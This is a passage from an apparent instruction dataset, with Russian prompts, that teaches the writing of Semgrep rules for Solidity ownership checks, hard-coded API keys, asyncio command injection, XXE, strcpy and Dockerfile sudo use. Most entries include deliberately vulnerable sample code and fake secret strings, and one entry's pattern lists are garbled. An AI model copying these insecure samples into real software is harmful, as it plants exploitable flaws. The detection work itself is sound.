...\n              }\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              if (<... _msgSender ...>) {\n                ...\n              }\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              onlyOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              requireOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              _requireOwnership(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              $C._enforceIsContractOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              $C._enforceOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              $C.enforceIsContractOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {}\n    languages: \n    - solidity\n    severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей 'unrestricted-transferownership' в смарт-контрактах Solidity. Правило проверяет наличие функции 'transferOwnership', которая не требует проверки права владения или авторизации перед передачей прав собственности. В опасных примерах функция вызывается без ограничений, позволяя любому пользователю передать право владения контрактом другому адресу. Безопасные примеры включают проверку владельца контракта через различные механизмы авторизации, такие как проверка сообщения отправителя или использование модификаторов доступа.\n\n# Ключевые элементы:\n- ID: unrestricted-transferownership\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "unrestricted-transferownership",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения twitter-api-key\nОписание уязвимости: A gitleaks twitter-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twitter-api-key.go\n// ruleid: twitter-api-key\ntwitter_api_token = \"u85rbvve240mfqz9y8xnkufuw\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: twitter-api-key.go\n// ruleid: twitter-api-key\ntwitter_api_token = \"u85rbvve240mfqz9y8xnkufuw\"\n\n• // File: another-twitter-go-key.go\nvar twitKey string = \"abc123def456ghijklmnopqrstuxyz\"\n• // File: yet-another-twitter-key.go\nconst TWITTER_API_KEY = \"123456789abcdef0123456789abcdfe\"\n\nБезопасные паттерны:  \n• // File: safe-twitter-key.go\nfunc getTwitterApiToken() string {\n   return os.Getenv(\"TWITTER_API_TOKEN\")\n}\n• // File: secure-twitter-key.go\nimport \"os\"\ntwitterApiToken := os.Getenv(\"TWITTER_API_KEY\")\n• // File: encrypted-twitter-key.go\nencryptedKey := encrypt(\"my-secret-twitter-key\")\n\nЛегенда аннотаций:\n- // ruleid:twitter-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twitter-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twitter-api-key\n  message: A gitleaks twitter-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:twitter)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{25})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Twitter API в исходном коде. Регулярное выражение ищет строку, содержащую слово 'twitter', за которым следует произвольная последовательность букв, цифр и специальных символов длиной до 20 символов, после чего идет оператор присваивания или сравнения ('=', ':', etc.) и далее строка из 25 шестнадцатеричных символов, которая является типичным форматом токена Twitter API.\n\n# Ключевые элементы:\n- ID: twitter-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twitter-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: dangerous-asyncio-shell-audit\nОписание уязвимости: Detected asyncio subprocess function without a static string. If this data can be controlled by a malicious actor, it may be an instance of command injection. Audit the use of this call to ensure it is not controllable by an external resource. You may consider using 'shlex.escape()'.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-asyncio-shell-audit.py\nimport asyncio\n\nclass AsyncEventLoop:\n    def __enter__(self):\n        self.loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(self.loop)\n        return self.loop\n\n    def __exit__(self, *args):\n        self.loop.close()\n\nclass WaitingProtocol(asyncio.SubprocessProtocol):\n    def __init__(self, exit_future):\n        self.exit_future = exit_future\n\n    def process_exited(self):\n        self.exit_future.set_result(True)\n\ndef vuln1(shell_command):\n    with AsyncEventLoop() as loop:\n        exit_future = asyncio.Future(loop=loop)\n        # ruleid: dangerous-asyncio-shell-audit\n        transport, _ = loop.run_until_complete(loop.subprocess_shell(lambda: WaitingProtocol(exit_future), shell_command))\n        loop.run_until_complete(exit_future)\n        transport.close()\n\ndef vuln2(shell_command):\n    with AsyncEventLoop() as loop:\n        # ruleid: dangerous-asyncio-shell-audit\n        proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_shell(shell_command))\n        loop.run_until_complete(proc.wait())\n\ndef ok1():\n    shell_command = 'echo \"Hello world\"'\n\n    with AsyncEventLoop() as loop:\n        exit_future = asyncio.Future(loop=loop)\n        # ok: dangerous-asyncio-shell-audit\n        transport, _ = loop.run_until_complete(loop.subprocess_shell(lambda: WaitingProtocol(exit_future), shell_command))\n        loop.run_until_complete(exit_future)\n        transport.close()\n\ndef ok2():\n    with AsyncEventLoop() as loop:\n        # ok: dangerous-asyncio-shell-audit\n        proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_shell('echo \"foobar\"'))\n        loop.run_until_complete(proc.wait())  # Ограничиваем длину\n\nОпасные паттерны:\n• transport, _ = loop.run_until_complete(loop.subprocess_shell(lambda: WaitingProtocol(exit_future), shell_command))\n• proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_shell(shell_command))\n\nБезопасные паттерны:  \n• shell_command = 'echo \"Hello world\"'\n• proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_shell('echo \"foobar\"'))\n\nЛегенда аннотаций:\n- // ruleid:dangerous-asyncio-shell-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-asyncio-shell-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-asyncio-shell-audit\n  patterns:\n  - pattern-either:\n    - pattern: $LOOP.subprocess_shell($PROTOCOL, $CMD)\n    - pattern: asyncio.subprocess.create_subprocess_shell($CMD, ...)\n    - pattern: asyncio.create_subprocess_shell($CMD, ...)\n  - pattern-not-inside: |\n      $CMD = \"...\"\n      ...\n  - pattern-not: $LOOP.subprocess_shell($PROTOCOL, \"...\")\n  - pattern-not: asyncio.subprocess.create_subprocess_shell(\"...\", ...)\n  - pattern-not: asyncio.create_subprocess_shell(\"...\", ...)\n  message: >-\n    Detected asyncio subprocess function without a static string. If this data can\n    be\n    controlled by a malicious actor, it may be an instance of command injection.\n    Audit the use of this call to ensure it is not controllable by an external resource.\n    You may consider using 'shlex.escape()'.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    references:\n    - https://docs.python.org/3/library/asyncio-subprocess.html\n    - https://docs.python.org/3/library/shlex.html\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages:\n  - python\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций asyncio.subprocess_shell или asyncio.create_subprocess_shell, которые используют переменную командной строки ($CMD) без статической строки. Это может привести к инъекции команд, если значение переменной контролируется злоумышленником. Правило исключает случаи, когда строка является статической (заключена в кавычки).\n\n# Ключевые элементы:\n- ID: dangerous-asyncio-shell-audit\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-asyncio-shell-audit",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: bittrex-access-key\nОписание уязвимости: A gitleaks bittrex-access-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: bittrex-access-key.go\n// ruleid: bittrex-access-key\nbittrex_api_token = \"bdx13k0d9sv7j6nv97alzfmmf6iv75bx\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: bittrex-access-key.go\n// ruleid: bittrex-access-key\nbittrex_api_token = \"bdx13k0d9sv7j6nv97alzfmmf6iv75bx\"\n• // File: example.py\nruleid: bittrex-access-key\nbittrex_access_key = 'bdx13k0d9sv7j6nv97alzfmmf6iv75bx'\n• // File: test.js\n// ruleid: bittrex-access-key\nconst bittrexKey = 'bdx13k0d9sv7j6nv97alzfmmf6iv75bx'\n\nБезопасные паттерны:  \n• // File: safe-code.go\ngoApiKey := os.Getenv(\"BITTREX_API_KEY\")\n• // File: python_code.py\napi_key = get_secret('BITTREX_ACCESS_KEY')\n• // File: nodejs_code.js\nconst bittrexKey = process.env.BITTREX_ACCESS_KEY\n\nЛегенда аннотаций:\n- // ruleid:bittrex-access-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bittrex-access-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: bittrex-access-key\n  message: A gitleaks bittrex-access-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:bittrex)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{32})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного ключа доступа Bittrex в исходном коде. Регулярное выражение ищет строку, содержащую слово 'bittrex' в любом регистре, за которым следуют произвольные символы длиной от 0 до 20, затем символ '=' или один из нескольких операторов сравнения, после чего следует строка длиной 32 символа, представляющая собой хэш-код доступа. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: bittrex-access-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "bittrex-access-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: detect-promptfoo\nОписание уязвимости: Possibly found usage of AI tooling: promptfoo\nCWE: \nТип анализа: search\nЯзык: js",
    "input": "Требования:\n- Язык: js\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-promptfoo.ts\n// ruleid: detect-promptfoo\nimport promptfoo from 'promptfoo';\n\n// ruleid: detect-promptfoo\nconst results = await promptfoo.evaluate(testSuite, options);  # Ограничиваем длину\n\nОпасные паттерны:\n• import promptfoo from 'promptfoo';\nconst results = await promptfoo.evaluate(testSuite, options);\n• import { evaluate } from 'promptfoo';\nevaluate(testSuite, options);\n\nБезопасные паттерны:  \n• import someOtherLibrary from 'someOtherLibrary';\nsomeOtherLibrary.evaluate(testSuite, options);\n• import promptfoo from 'promptfoo';\nsomeFunction(promptfoo);\n\nЛегенда аннотаций:\n- // ruleid:detect-promptfoo: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-promptfoo: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-promptfoo\n    languages:\n      - js\n      - ts\n    severity: INFO\n    message: \"Possibly found usage of AI tooling: promptfoo\"\n    pattern-either:\n      - pattern: import \"promptfoo\"\n      - pattern: promptfoo.evaluate(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных вызовов функции или импорта модуля, связанных с инструментом AI, названным 'promptfoo'. Анализ выполняется путем поиска строк, содержащих либо импорт модуля 'promptfoo', либо непосредственный вызов метода 'evaluate' этого модуля. Правило использует оператор 'pattern-either' для объединения двух шаблонов поиска в единый поисковый запрос.\n\n# Ключевые элементы:\n- ID: detect-promptfoo\n- Язык: js \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-promptfoo",
      "language": "js",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: no-sudo-in-dockerfile\nОписание уязвимости: Avoid using sudo in Dockerfiles. Running processes as a non-root user can help  reduce the potential impact of configuration errors and security vulnerabilities.\nCWE: CWE-250: Execution with Unnecessary Privileges\nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: CWE-250: Execution with Unnecessary Privileges\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-sudo-in-dockerfile.dockerfile\n# Use an official Ubuntu 20.04 as base image\nFROM ubuntu:20.04\n\nENV DEBIAN_FRONTEND noninteractive\n\n# ok: no-sudo-in-dockerfile\nRUN apt-get update && apt-get upgrade -y\n\n# ok: no-sudo-in-dockerfile\nRUN apt-get install -y sudo\n\nRUN useradd -ms /bin/bash newuser\n\nRUN echo \"newuser ALL=(ALL:ALL) NOPASSWD:ALL\" >> /etc/sudoers\n\nUSER newuser\n\n# ruleid: no-sudo-in-dockerfile\nRUN sudo apt-get install -y curl\n\nCMD [\"echo\", \"Hello, Docker!\"]  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN sudo apt-get install -y curl\n• RUN sudo yum update -y\n\nБезопасные паттерны:  \n• RUN apt-get update && apt-get upgrade -y\n• RUN yum install -y package-name\n\nЛегенда аннотаций:\n- // ruleid:no-sudo-in-dockerfile: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-sudo-in-dockerfile: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-sudo-in-dockerfile\n  patterns:\n  - pattern: |\n      RUN sudo ...\n  message: >-\n    Avoid using sudo in Dockerfiles. Running processes as a non-root user can help \n    reduce the potential impact of configuration errors and security vulnerabilities.\n  metadata:\n    category: security\n    technology:\n    - dockerfile\n    cwe: \n    - 'CWE-250: Execution with Unnecessary Privileges'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://cwe.mitre.org/data/definitions/250.html\n    - https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n  languages:\n  - dockerfile\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инструкций RUN в Dockerfile, которые содержат команду 'sudo'. Паттерн ищет точное соответствие строке 'RUN sudo ...', где троеточие обозначает произвольную последовательность символов после 'sudo'. Правило применимо только к Dockerfile и выдает предупреждение о необходимости избегать использования команды 'sudo' внутри Dockerfile, так как выполнение процессов не от имени root может снизить потенциальный ущерб от ошибок конфигурации и уязвимостей безопасности.\n\n# Ключевые элементы:\n- ID: no-sudo-in-dockerfile\n- Язык: dockerfile \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-sudo-in-dockerfile",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: useless-ternary\nОписание уязвимости: It looks like no matter how $CONDITION is evaluated, this expression returns $ANS. This is probably a copy-paste error.\nCWE: \nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: useless-ternary.tsx\n// ruleid:useless-ternary\ncard.id.includes(\":\") ? `/r/${card.id}` : `/r/${card.id}`\n\n// ok\ncard.id.includes(\":\") ? `/s/${card.id}` : `/r/${card.id}`  # Ограничиваем длину\n\nОпасные паттерны:\n• card.id.includes(\\\n• ) ? \\\n•  : \\\n\nБезопасные паттерны:  \n• card.id.includes(\\\n• ) ? \\\n•  : \\\n\nЛегенда аннотаций:\n- // ruleid:useless-ternary: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:useless-ternary: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: useless-ternary\n    pattern: |\n      $CONDITION ? $ANS : $ANS\n    message:\n      It looks like no matter how $CONDITION is evaluated, this expression returns $ANS. This is probably a copy-paste\n      error.\n    languages:\n      - typescript\n      - javascript\n    metadata:\n      category: correctness\n      technology:\n        - react\n    severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска выражений тернарной операции, где независимо от результата условия ($CONDITION) всегда возвращается одно и то же значение ($ANS). Это может указывать на ошибку копирования-вставки, когда разработчик случайно использовал одинаковое значение в обоих ветвях оператора тернарной операции.\n\n# Ключевые элементы:\n- ID: useless-ternary\n- Язык: typescript \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "useless-ternary",
      "language": "typescript",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: xmldocument-unsafe-parser-override\nОписание уязвимости: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity (XXE) injection if supplied with user-controllable data.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: taint\nЯзык: csharp\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: taint\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xmldocument-unsafe-parser-override.cs\npublic class Foo{\n    public void LoadBad(string input)\n    {\n        string fileName = @\"C:\\Users\\user\\Documents\\test.xml\";\n        XmlDocument xmlDoc = new XmlDocument();\n        xmlDoc.XmlResolver = new XmlUrlResolver();\n        // ruleid: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n\n    public static void StaticLoadBad(string input)\n    {\n        string fileName = @\"C:\\Users\\user\\Documents\\test.xml\";\n        XmlDocument xmlDoc = new XmlDocument();\n        xmlDoc.XmlResolver = new XmlUrlResolver();\n        // ruleid: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n    \n    public void LoadGood(string input)\n    {\n        XmlDocument xmlDoc = new XmlDocument();\n        // ok: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• public void LoadBad(string input)\n• public static void StaticLoadBad(string input)\n\nБезопасные паттерны:  \n• public void LoadGood(string input)\n\nЛегенда аннотаций:\n- // ruleid:xmldocument-unsafe-parser-override: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xmldocument-unsafe-parser-override: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: xmldocument-unsafe-parser-override\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - focus-metavariable: $ARG\n    - pattern-inside: |\n        public $T $M(...,string $ARG,...){...}\n  pattern-sinks:\n  - patterns:\n    - pattern: |\n        $XMLDOCUMENT.$METHOD(...)\n    - pattern-inside: |\n        XmlDocument $XMLDOCUMENT = new XmlDocument(...);\n        ...\n        $XMLDOCUMENT.XmlResolver = new XmlUrlResolver(...);\n        ...  \n  message: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument\n    from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity\n    (XXE) injection if supplied with user-controllable data.\n  languages:\n  - csharp\n  severity: WARNING\n  metadata:\n    category: security\n    references:\n    - https://www.jardinesoftware.net/2016/05/26/xxe-and-net/\n    - https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmldocument.xmlresolver?view=net-6.0#remarks\n    technology:\n    - .net\n    - xml\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: LOW\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования XmlDocument.Load с аргументом типа string, который поступает из публичного метода. Паттерн источников определяет методы, принимающие строковый аргумент, используя метапеременную $ARG. Паттерны синков ищут создание XmlDocument и последующее назначение XmlResolver с последующим вызовом Load. Правило предупреждает о возможности XXE-инъекции при разрешении обработки DTD.\n\n# Ключевые элементы:\n- ID: xmldocument-unsafe-parser-override\n- Язык: csharp \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xmldocument-unsafe-parser-override",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: insecure-use-string-copy-fn\nОписание уязвимости: Finding triggers whenever there is a strcpy or strncpy used. This is an issue because strcpy does not affirm the size of the destination array and strncpy will not automatically NULL-terminate strings. This can lead to buffer overflows, which can cause program crashes and potentially let an attacker inject code in the program. Fix this by using strcpy_s instead (although note that strcpy_s is an optional part of the C11 standard, and so may not be available).\nCWE: CWE-676: Use of Potentially Dangerous Function\nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: CWE-676: Use of Potentially Dangerous Function\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-use-string-copy-fn.c\n#include <stdio.h>\n\nint DST_BUFFER_SIZE = 120;\n\nint bad_strcpy(src, dst) {\n    n = DST_BUFFER_SIZE;\n    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))\n    {\n        // ruleid: insecure-use-string-copy-fn\n        strcpy(dst, src);\n\n        // ruleid: insecure-use-string-copy-fn\n        strncpy(dst, src, 100);\n    }\n}\n\nint main() {\n   printf(\"Hello, World!\");\n   return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• strcpy(dst, src);\n• strncpy(dst, src, 100);\n\nБезопасные паттерны:  \n• strcpy_s(dst, sizeof(dst), src);\n• snprintf(dst, sizeof(dst)-1, src);\n\nЛегенда аннотаций:\n- // ruleid:insecure-use-string-copy-fn: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-use-string-copy-fn: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-use-string-copy-fn\n  pattern-either:\n  - pattern: strcpy(...)\n  - pattern: strncpy(...)\n  message: >-\n    Finding triggers whenever there is a strcpy or strncpy used.\n    This is an issue because strcpy does not affirm the size of the destination array\n    and strncpy will not automatically NULL-terminate strings.\n    This can lead to buffer overflows, which can cause program crashes\n    and potentially let an attacker inject code in the program.\n    Fix this by using strcpy_s instead (although note that strcpy_s is an\n    optional part of the C11 standard, and so may not be available).\n  metadata:\n    cwe:\n    - 'CWE-676: Use of Potentially Dangerous Function'\n    references:\n    - https://cwe.mitre.org/data/definitions/676\n    - https://nvd.nist.gov/vuln/detail/CVE-2019-11365\n    category: security\n    technology:\n    - c\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  languages: [c]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций strcpy и strncpy в коде на языке C. Паттерн использует конструкцию pattern-either для обнаружения обоих функций. Если обнаружена одна из этих функций, выдается сообщение об уязвимости, указывающее на потенциальную проблему с буфером переполнения, связанную с отсутствием проверки размера назначения и автоматического завершения нулевым символом. Рекомендуется использовать функцию strcpy_s вместо них, хотя следует учитывать, что strcpy_s является необязательной частью стандарта C11.\n\n# Ключевые элементы:\n- ID: insecure-use-string-copy-fn\n- Язык: c \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-use-string-copy-fn",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: azure-appservice-client-certificate\nОписание уязвимости: Ensure the web app has Client Certificates\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-client-certificate.tf\n# fail\n# ruleid: azure-appservice-client-certificate\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_service_plan_id = azurerm_app_service_plan.example.id\n    client_cert_enabled          = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n    name = \"example-app-service\"\n    location = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    ap\n• resource \"azurerm_web_app\" \"example\" { \n    name = \"example-web-app\"\n    location = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_servic\n• resource \"azurerm_function_app\" \"example\" { \n    name = \"example-function-app\"\n    location = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    \n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { \n    name = \"example-app-service\"\n    location = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    ap\n• resource \"azurerm_web_app\" \"example\" { \n    name = \"example-web-app\"\n    location = 